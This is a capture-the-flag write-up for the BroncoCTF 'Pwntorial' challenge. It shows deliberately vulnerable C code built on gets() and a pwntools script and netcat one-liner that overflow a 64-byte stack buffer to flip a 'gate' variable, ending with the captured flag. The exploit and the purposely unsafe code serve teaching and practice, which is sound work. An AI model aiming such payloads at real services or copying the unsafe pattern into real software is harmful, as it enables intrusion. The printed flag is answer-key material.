# Pwntorial — BroncoCTF PWN Challenge

- **Category:** Pwn
- **Flag:** `bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}`


---

## Challenge Description

> I've gotten complaints that BroncoCTF has no PWN. But, I think the more important issue is that our students don't know HOW to PWN!
>
> Behold: the PWNTORIAL. This'll solve all your pwn knowledge holes!
>
> Google Docs: The Pwntorial
>
> ...yeah it's just an AI Slop Google Doc but surely that's enough to educate college students nowadays, right?

---

## Reconnaissance

We are given:
1. A network service: `0.cloud.chals.io:19476`
2. A Google Doc tutorial titled "The Pwntorial"

### The Google Doc

The document is a satirical lecture by "Professor Zero-Day Yoshie" teaching buffer overflows. It contains the vulnerable source code (`pwnable.c`):

```c
int main(int argc, char *argv[]) {
    volatile int gate = CLOSED;  // TARGET — must be non-zero to win
    char buffer[64];             // THE BUCKET — 64 byte buffer

    gets(buffer);                // THE SPILL — no bounds checking!

    if (gate == CLOSED) {
        // Fail
    } else {
        // Win!
    }
}
```

**The vulnerability:** `gets()` reads input with no length check, so writing past 64 bytes overflows into adjacent stack memory. The `gate` variable sits right after the buffer on the stack.

### The Service

Connecting to the service:

```bash
nc 0.cloud.chals.io 19476
```

```
[-] Try again. The gate is still closed.
```

The program reads input with `gets()`, checks if `gate == 0`, and prints success/failure accordingly.

---

## Exploit Strategy

The tutorial suggests this payload structure:
- **64 bytes of junk** — fill the buffer
- **4+ non-zero bytes** — overwrite `gate`

But compilers insert alignment padding between stack variables. The actual offset from the buffer start to `gate` is **not** exactly 64 bytes.

---

## Exploit Development

We brute-force the offset by sending incrementally larger payloads.

### Python Script (pwntools)

```python
from pwn import *

context.log_level = 'info'

for offset in [64, 68, 72, 76, 80, 96, 100, 128, 256]:
    try:
        r = remote('0.cloud.chals.io', 19476, timeout=5)
        r.recvuntil(b'closed.')
        payload = b'A' * offset + b'B' * 4
        r.sendline(payload)
        resp = r.recvall(timeout=3)
        r.close()
        print(f'offset={offset}: {resp}')
    except Exception as e:
        print(f'offset={offset}: error - {e}')
```

### Results

| Offset | Result |
|--------|--------|
| 64 | Gate still closed |
| 68 | Gate still closed |
| 72 | Gate still closed |
| **76** | **SUCCESS — flag obtained** |
| 80+ | SUCCESS (still works past offset) |

---

## The Flag

After sending **76 bytes of padding + 4 non-zero bytes**, the service responds:

```
[+] SUCCESS! Welcome inside, aspiring pwner!
bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}
```

**Flag:** `bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}`

---

## Reproduction Steps

1. **Connect to the challenge server:**
   ```bash
   nc 0.cloud.chals.io 19476
   ```

2. **Send the overflow payload:**
   The quick way using Python one-liner:
   ```bash
   python3 -c "import sys; sys.stdout.buffer.write(b'A'*76 + b'B'*4)" | nc 0.cloud.chals.io 19476
   ```

3. **Or use pwntools:**
   ```python
   from pwn import *
   r = remote('0.cloud.chals.io', 19476)
   r.recvuntil(b'closed.')
   r.sendline(b'A' * 76 + b'B' * 4)
   print(r.recvall().decode())
   ```

---

## Key Takeaways

- **`gets()` is inherently unsafe** — never use it in real code. Use `fgets()` with a size limit instead.
- **Stack variables may have alignment padding** — the tutorial said 64 bytes, but the actual offset was 76 due to compiler alignment.
- **Simple variable overwrite** — this is the most basic form of buffer overflow: overwriting an adjacent variable to bypass an authorization check.
- **pwntools** makes socket communication and payload crafting much easier than raw `nc`.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `netcat` / `nc` | Raw TCP connection to challenge |
| `pwntools` | Python library for exploit development and socket handling |
| `Python 3` | Payload generation and scripting |
